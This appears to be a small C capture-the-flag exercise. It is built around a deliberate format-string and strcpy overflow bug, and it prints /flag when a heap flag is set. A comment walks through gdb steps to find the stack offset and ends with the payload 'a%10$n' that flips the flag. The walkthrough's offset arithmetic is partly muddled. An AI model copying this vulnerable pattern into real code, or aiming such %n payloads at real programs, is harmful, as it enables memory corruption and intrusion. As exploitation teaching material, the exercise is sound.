#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(int ac, char **av)
{
	char fmt_str[256];
    char buf[256];
    int *print_flag = malloc(sizeof(int));
    *print_flag = 0;

	char *secret_value = "my secret value";
	strcpy(fmt_str, av[1]);
	strcat(fmt_str, "\n");

	printf(fmt_str, 0xBEEF1337);
	if(*print_flag)
    {
        int fd = open("/flag", O_RDONLY);
        read(fd, buf, 256);
        write(1, buf, 256);
    }
    return 0;
}

/* 
1. gdb ./a.out
2. b *main
3. r
4. x/6i $rip
5. ni --> to move forword and set rbp and rsp (7x)
6. disass main --> here we will find the flag comparisn(int fd = open("/flag", O_RDONLY);)
    in text(where it is occuring), je(jump), above those, we will find that "eax = rax" and 
    "rax = rbp - 0x220"
7. p $rbp - 0x220 --> get the location of that
8. p $rsp --> get the location of that
9. p/x 0x232424..(location of rbp-220) - 0xr3434(location of rsp) --> get the distance. I may
    show 0x20, that mean distance is 20 bytes
10. now printf forward looking for arguments, and they are all of set lenght 8. so 
11. p 0x20 / 0x8 --> 4
12. we know that the 6th arguments in the top of the stack, that would be rsp.
13. so we can assumed that the print_flag arg is in 4+6=10th argument from printf perspective.
14. ./a.out 'a%10$n' --> show us the 10th arguments and the flag.
*/